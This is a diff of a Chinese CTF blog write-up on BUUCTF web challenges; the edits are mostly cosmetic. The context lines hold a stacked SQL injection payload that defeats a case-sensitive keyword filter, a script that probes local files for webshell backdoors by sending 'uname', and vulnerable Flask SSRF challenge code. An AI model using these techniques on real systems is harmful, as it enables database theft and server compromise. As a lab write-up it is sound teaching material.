@@ -274,7 +274,7 @@ height:50vh;
                 
                 
                     <div class="post-intro-read">
-                        <span>Word count: <span class="post-count word-count">3k</span>Reading time: <span class="post-count reading-time">14 min</span></span>
+                        <span>Word count: <span class="post-count word-count">3k</span>Reading time: <span class="post-count reading-time">13 min</span></span>
                     </div>
                 
                 <div class="post-intro-meta">
@@ -434,14 +434,14 @@ height:50vh;
 <figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">strstr($inject, <span class="string">"set"</span>) &amp;&amp; strstr($inject, <span class="string">"prepare"</span>)</span><br></pre></td></tr></table></figure>
 
 <blockquote>
-<p>strstr()函数介绍：<br>用于查找字符串的首次出现<br>语法：strstr ( string <code>$haystack</code> , <a href="https://www.php.net/manual/zh/language.pseudo-types.php#language.types.mixed" target="_blank" rel="noopener">mixed</a> <code>$needle</code> [, bool <code>$before_needle</code> = <strong>FALSE</strong> ] ) : string<br>返回 <code>haystack</code> 字符串从 <code>needle</code> 第一次出现的位置开始到 <code>haystack</code> 结尾的字符串。</p>
-<p>！该函数区分大小写。如果想要不区分大小写，请使用 <a href="https://www.php.net/manual/zh/function.stristr.php" target="_blank" rel="noopener">stristr()</a>。！</p>
+<p>strstr()函数介绍：<br>用于查找字符串的首次出现<br>语法：strstr ( string `$haystack` , <a href="https://www.php.net/manual/zh/language.pseudo-types.php#language.types.mixed" target="_blank" rel="noopener">mixed</a> `$needle` [, bool `$before_needle` = <strong>FALSE</strong> ] ) : string<br>返回 <code>haystack</code> 字符串从 <code>needle</code> 第一次出现的位置开始到 <code>haystack</code> 结尾的字符串。</p>
+<p>该函数区分大小写。如果想要不区分大小写，请使用 <a href="https://www.php.net/manual/zh/function.stristr.php" target="_blank" rel="noopener">stristr()</a>。</p>
 <p>区分大小写的意思是如果是小写的就不能判断出大写的。。。<br>该函数不能区分大小写，所以我们大写即可。<br>它不能区分大小写，所以使用它的时候是区分大小写的。。。<br>所以也就是：该函数区分大小写=该函数不能区分大小写。嗯很有道理。！</p>
 </blockquote>
 <p>所以对于这个检测，可以直接通过大写绕过：</p>
 <figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">?inject=233';<span class="keyword">sEt</span> @<span class="keyword">sql</span>=<span class="keyword">concat</span>(<span class="string">'se'</span>,<span class="string">'lect * from `1919810931114514`'</span>);</span><br><span class="line"><span class="keyword">prEpare</span> pay <span class="keyword">from</span> @<span class="keyword">sql</span>;</span><br><span class="line"><span class="keyword">execute</span> pay;</span><br></pre></td></tr></table></figure>
 
-<p>然后就能看到flag啦~</p>
+<p>然后就能看到flag~</p>
 <p><img src="/2019/09/03/BUUCTF-WEB/1567736159943.png" alt="1567736159943"></p>
 <p>此外，还能采用hex编码的形式，在python2中~</p>
 <p><img src="/2019/09/03/BUUCTF-WEB/1567736240567.png" alt="1567736240567"></p>
@@ -498,7 +498,7 @@ height:50vh;
 <blockquote>
 <p>参考wp：<a href="https://mochazz.github.io/2019/05/27/2019强网杯Web部分题解/#高明的黑客" target="_blank" rel="noopener">https://mochazz.github.io/2019/05/27/2019强网杯Web部分题解/#高明的黑客</a></p>
 </blockquote>
-<p>这道题也真够猛的！!</p>
+<p>这道题有点猛…</p>
 <p><img src="/2019/09/03/BUUCTF-WEB/1567768512837.png" alt="1567768512837"></p>
 <p>根据提示下载源码，给了一大堆混乱的文件，需要从这些文件中找能用的shell…</p>
 <p>写脚本批量扫描一下类似<code>eval($_GET[x])</code>或<code>system($_GET[x])</code>等shell。</p>
@@ -507,9 +507,9 @@ height:50vh;
 
 <p><img src="/2019/09/03/BUUCTF-WEB/1567769481174.png" alt="1567769481174"></p>
 <blockquote>
-<p>话说这里，<br>-S 127.0.0.0:8000可以正常访问，<br>-S localhost:8000就不能访问，<br>什么鬼嗷😡</p>
+<p>话说这里，<br>-S 127.0.0.0:8000可以正常访问，<br>-S localhost:8000就不能访问，<br>什么鬼…</p>
 </blockquote>
-<p>访问localhost:8888，能够看到页面显示正常，就可以开始跑脚本啦 - -</p>
+<p>访问localhost:8888，能够看到页面显示正常，就开始跑脚本 - -</p>
 <p><img src="/2019/09/03/BUUCTF-WEB/1567769555902.png" alt="1567769555902"></p>
 <p>直接借用了这个nb师傅的脚本（tqltqltql~）：</p>
 <figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> os,re</span><br><span class="line"><span class="keyword">import</span> requests</span><br><span class="line">filenames = os.listdir(<span class="string">'/var/www/html/src'</span>)</span><br><span class="line">pattern = re.compile(<span class="string">r"\$_[GEPOST]&#123;3,4&#125;\[.*\]"</span>)</span><br><span class="line"><span class="keyword">for</span> name <span class="keyword">in</span> filenames:</span><br><span class="line">    print(name)</span><br><span class="line">    <span class="keyword">with</span> open(<span class="string">'/var/www/html/src/'</span>+name,<span class="string">'r'</span>) <span class="keyword">as</span> f:</span><br><span class="line">        data = f.read()</span><br><span class="line">    result = list(set(pattern.findall(data)))</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">for</span> ret <span class="keyword">in</span> result:</span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        command = <span class="string">'uname'</span></span><br><span class="line">        flag = <span class="string">'Linux'</span></span><br><span class="line">        <span class="keyword">if</span> <span class="string">'GET'</span> <span class="keyword">in</span> ret:</span><br><span class="line">            passwd = re.findall(<span class="string">r"'(.*)'"</span>,ret)[<span class="number">0</span>]</span><br><span class="line">            r = requests.get(url=<span class="string">'http://127.0.0.1:8888/'</span> + name + <span class="string">'?'</span> + passwd + <span class="string">'='</span>+ command)</span><br><span class="line">            <span class="keyword">if</span> flag <span class="keyword">in</span> r.text:</span><br><span class="line">                print(<span class="string">'backdoor file is: '</span> + name)</span><br><span class="line">                print(<span class="string">'GET:  '</span> + passwd)</span><br><span class="line">        <span class="keyword">elif</span> <span class="string">'POST'</span> <span class="keyword">in</span> ret:</span><br><span class="line">            passwd = re.findall(<span class="string">r"'(.*)'"</span>,ret)[<span class="number">0</span>]</span><br><span class="line">            r = requests.post(url=<span class="string">'http://127.0.0.1:8888/'</span> + name,data=&#123;passwd:command&#125;)</span><br><span class="line">            <span class="keyword">if</span> flag <span class="keyword">in</span> r.text:</span><br><span class="line">                print(<span class="string">'backdoor file is: '</span> + name)</span><br><span class="line">                print(<span class="string">'POST:  '</span> + passwd)</span><br><span class="line">    <span class="keyword">except</span> : <span class="keyword">pass</span></span><br></pre></td></tr></table></figure>
@@ -573,7 +573,7 @@ height:50vh;
 </blockquote>
 <blockquote>
 <p>参考wp：<br><a href="https://ctftime.org/writeup/16070" target="_blank" rel="noopener">https://ctftime.org/writeup/16070</a></p>
-<p>官方wp：<br>[<a href="https://github.com/De1ta-team/De1CTF2019/tree/master/writeup/web/SSRF%20Me]" target="_blank" rel="noopener">https://github.com/De1ta-team/De1CTF2019/tree/master/writeup/web/SSRF%20Me]</a>(<a href="https://github.com/De1ta-team/De1CTF2019/tree/master/writeup/web/SSRF" target="_blank" rel="noopener">https://github.com/De1ta-team/De1CTF2019/tree/master/writeup/web/SSRF</a> Me)</p>
+<p>官方wp：<br><a href="https://github.com/De1ta-team/De1CTF2019/tree/master/writeup/web/SSRF%20Me" target="_blank" rel="noopener">https://github.com/De1ta-team/De1CTF2019/tree/master/writeup/web/SSRF%20Me</a></p>
 </blockquote>
 <p>题目给了接口的Flask应用程序的源代码：</p>
 <figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#! /usr/bin/env python </span></span><br><span class="line"><span class="comment">#encoding=utf-8 </span></span><br><span class="line"><span class="keyword">from</span> flask <span class="keyword">import</span> Flask </span><br><span class="line"><span class="keyword">from</span> flask <span class="keyword">import</span> request </span><br><span class="line"><span class="keyword">import</span> socket </span><br><span class="line"><span class="keyword">import</span> hashlib </span><br><span class="line"><span class="keyword">import</span> urllib </span><br><span class="line"><span class="keyword">import</span> sys </span><br><span class="line"><span class="keyword">import</span> os </span><br><span class="line"><span class="keyword">import</span> json </span><br><span class="line"></span><br><span class="line">reload(sys) </span><br><span class="line">sys.setdefaultencoding(<span class="string">'latin1'</span>) </span><br><span class="line">app = Flask(__name__) secert_key = os.urandom(<span class="number">16</span>) </span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Task</span>:</span> </span><br><span class="line">	<span class="function"><span class="keyword">def</span> <span class="title">__init__</span><span class="params">(self, action, param, sign, ip)</span>:</span> </span><br><span class="line">		self.action = action </span><br><span class="line">		self.param = param </span><br><span class="line">		self.sign = sign </span><br><span class="line">		self.sandbox = md5(ip) </span><br><span class="line">		<span class="keyword">if</span>(<span class="keyword">not</span> os.path.exists(self.sandbox)): </span><br><span class="line">			<span class="comment">#SandBox For Remote_Addr </span></span><br><span class="line">			os.mkdir(self.sandbox) </span><br><span class="line"></span><br><span class="line">		<span class="function"><span class="keyword">def</span> <span class="title">Exec</span><span class="params">(self)</span>:</span> </span><br><span class="line">			result = &#123;&#125; </span><br><span class="line">			result[<span class="string">'code'</span>] = <span class="number">500</span> </span><br><span class="line">			<span class="keyword">if</span> (self.checkSign()): </span><br><span class="line">				<span class="keyword">if</span> <span class="string">"scan"</span> <span class="keyword">in</span> self.action: </span><br><span class="line">					tmpfile = open(<span class="string">"./%s/result.txt"</span> % self.sandbox, <span class="string">'w'</span>) </span><br><span class="line">					resp = scan(self.param) </span><br><span class="line">					<span class="keyword">if</span> (resp == <span class="string">"Connection Timeout"</span>): </span><br><span class="line">						result[<span class="string">'data'</span>] = resp </span><br><span class="line">					<span class="keyword">else</span>: </span><br><span class="line">						<span class="keyword">print</span> resp </span><br><span class="line">						tmpfile.write(resp) </span><br><span class="line">						tmpfile.close() result[<span class="string">'code'</span>] = <span class="number">200</span> </span><br><span class="line">				<span class="keyword">if</span> <span class="string">"read"</span> <span class="keyword">in</span> self.action: </span><br><span class="line">					f = open(<span class="string">"./%s/result.txt"</span> % self.sandbox, <span class="string">'r'</span>) </span><br><span class="line">					result[<span class="string">'code'</span>] = <span class="number">200</span> </span><br><span class="line">					result[<span class="string">'data'</span>] = f.read() </span><br><span class="line">				<span class="keyword">if</span> result[<span class="string">'code'</span>] == <span class="number">500</span>: </span><br><span class="line">					result[<span class="string">'data'</span>] = <span class="string">"Action Error"</span> </span><br><span class="line">				<span class="keyword">else</span>: </span><br><span class="line">					result[<span class="string">'code'</span>] = <span class="number">500</span> </span><br><span class="line">					result[<span class="string">'msg'</span>] = <span class="string">"Sign Error"</span> </span><br><span class="line">					<span class="keyword">return</span> result</span><br><span class="line">		<span class="function"><span class="keyword">def</span> <span class="title">checkSign</span><span class="params">(self)</span>:</span> </span><br><span class="line">			<span class="keyword">if</span> (getSign(self.action, self.param) == self.sign): </span><br><span class="line">				<span class="keyword">return</span> <span class="literal">True</span> </span><br><span class="line">			<span class="keyword">else</span>: </span><br><span class="line">				<span class="keyword">return</span> <span class="literal">False</span> </span><br><span class="line"></span><br><span class="line"><span class="comment">#generate Sign For Action Scan. </span></span><br><span class="line"><span class="meta">@app.route("/geneSign", methods=['GET', 'POST']) </span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">geneSign</span><span class="params">()</span>:</span> </span><br><span class="line">	param = urllib.unquote(request.args.get(<span class="string">"param"</span>, <span class="string">""</span>)) </span><br><span class="line">	action = <span class="string">"scan"</span> </span><br><span class="line">	<span class="keyword">return</span> getSign(action, param) </span><br><span class="line"></span><br><span class="line"><span class="meta">@app.route('/De1ta',methods=['GET','POST']) </span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">challenge</span><span class="params">()</span>:</span> </span><br><span class="line">	action = urllib.unquote(request.cookies.get(<span class="string">"action"</span>)) </span><br><span class="line">	param = urllib.unquote(request.args.get(<span class="string">"param"</span>, <span class="string">""</span>)) </span><br><span class="line">	sign = urllib.unquote(request.cookies.get(<span class="string">"sign"</span>)) </span><br><span class="line">	ip = request.remote_addr </span><br><span class="line">	<span class="keyword">if</span>(waf(param)): </span><br><span class="line">		<span class="keyword">return</span> <span class="string">"No Hacker!!!!"</span> </span><br><span class="line">	task = Task(action, param, sign, ip) </span><br><span class="line">	<span class="keyword">return</span> json.dumps(task.Exec()) </span><br><span class="line"></span><br><span class="line"><span class="meta">@app.route('/') </span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">index</span><span class="params">()</span>:</span> </span><br><span class="line">	<span class="keyword">return</span> open(<span class="string">"code.txt"</span>,<span class="string">"r"</span>).read() </span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">scan</span><span class="params">(param)</span>:</span> </span><br><span class="line">	socket.setdefaulttimeout(<span class="number">1</span>) </span><br><span class="line">	<span class="keyword">try</span>: </span><br><span class="line">		<span class="keyword">return</span> urllib.urlopen(param).read()[:<span class="number">50</span>] </span><br><span class="line">	<span class="keyword">except</span>: </span><br><span class="line">		<span class="keyword">return</span> <span class="string">"Connection Timeout"</span> </span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">getSign</span><span class="params">(action, param)</span>:</span> </span><br><span class="line">	<span class="keyword">return</span> hashlib.md5(secert_key + param + action).hexdigest() </span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">md5</span><span class="params">(content)</span>:</span> </span><br><span class="line">	<span class="keyword">return</span> hashlib.md5(content).hexdigest() </span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">waf</span><span class="params">(param)</span>:</span> </span><br><span class="line">	check=param.strip().lower() </span><br><span class="line">	<span class="keyword">if</span> check.startswith(<span class="string">"gopher"</span>) <span class="keyword">or</span> check.startswith(<span class="string">"file"</span>): </span><br><span class="line">		<span class="keyword">return</span> <span class="literal">True</span> </span><br><span class="line">	<span class="keyword">else</span>: <span class="keyword">return</span> <span class="literal">False</span> </span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">'__main__'</span>: </span><br><span class="line">	app.debug = <span class="literal">False</span> </span><br><span class="line">	app.run(host=<span class="string">'0.0.0.0'</span>,port=<span class="number">80</span>)</span><br></pre></td></tr></table></figure>
@@ -640,7 +640,7 @@ height:50vh;
             <p>Author：<a href="http://laure1.github.io">Laurel</a>
             <p>原文链接：<a href="http://yoursite.com/2019/09/03/BUUCTF-WEB/">http://yoursite.com/2019/09/03/BUUCTF-WEB/</a>
             <p>发表日期：<a href="http://yoursite.com/2019/09/03/BUUCTF-WEB/">September 3rd 2019, 11:12:42 pm</a>
-            <p>更新日期：<a href="http://yoursite.com/2019/09/03/BUUCTF-WEB/">September 13th 2019, 1:11:50 am</a>
+            <p>更新日期：<a href="http://yoursite.com/2019/09/03/BUUCTF-WEB/">September 25th 2019, 5:38:18 am</a>
             <p>版权声明：本文采用<a rel="license" href="http://creativecommons.org/licenses/by-nc/4.0/">知识共享署名-非商业性使用 4.0 国际许可协议</a>进行许可</p>
         </div>
     
@@ -876,9 +876,28 @@ top:50vh;
     
     
     
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
     <div class="total-and-search">
         <div class="total-archive">
-        Total : 6
+        Total : 7
         </div>
         <!-- search  -->
         
@@ -891,6 +910,11 @@ top:50vh;
     
     <div class="archive-year"> 2019 </div>
     <ul class="year-list">
+    
+    
+        <li class="archive-post-item">
+            <span class="archive-post-date">09/25</span><a class="archive-post-title" href= "/2019/09/25/zjctf2019/" >ZJCTF2019</a>
+        </li>
     
     
         <li class="archive-post-item">
@@ -927,15 +951,17 @@ top:50vh;
         <div class="sidebar-panel-tags">
     <div class="sidebar-tags-name">
     
-        <span class="sidebar-tag-name" data-tags="Web"><span class="iconfont-archer">&#xe606;</span>Web</span>
-    
-        <span class="sidebar-tag-name" data-tags="Brush"><span class="iconfont-archer">&#xe606;</span>Brush</span>
-    
         <span class="sidebar-tag-name" data-tags="Java"><span class="iconfont-archer">&#xe606;</span>Java</span>
     
         <span class="sidebar-tag-name" data-tags="Misc"><span class="iconfont-archer">&#xe606;</span>Misc</span>
     
+        <span class="sidebar-tag-name" data-tags="Web"><span class="iconfont-archer">&#xe606;</span>Web</span>
+    
         <span class="sidebar-tag-name" data-tags="SQL"><span class="iconfont-archer">&#xe606;</span>SQL</span>
+    
+        <span class="sidebar-tag-name" data-tags="Brush"><span class="iconfont-archer">&#xe606;</span>Brush</span>
+    
+        <span class="sidebar-tag-name" data-tags="Competition"><span class="iconfont-archer">&#xe606;</span>Competition</span>
     
     </div>
     <div class="iconfont-archer sidebar-tags-empty">&#xe678;</div>
@@ -970,11 +996,11 @@ jsonContent:
         <div class="sidebar-panel-categories">
     <div class="sidebar-categories-name">
     
-        <span class="sidebar-category-name" data-categories="CTF"><span class="iconfont-archer">&#xe60a;</span>CTF</span>
-    
         <span class="sidebar-category-name" data-categories="JAVA"><span class="iconfont-archer">&#xe60a;</span>JAVA</span>
     
         <span class="sidebar-category-name" data-categories="SQL"><span class="iconfont-archer">&#xe60a;</span>SQL</span>
+    
+        <span class="sidebar-category-name" data-categories="CTF"><span class="iconfont-archer">&#xe60a;</span>CTF</span>
     
     </div>
     <div class="iconfont-archer sidebar-categories-empty">&#xe678;</div>
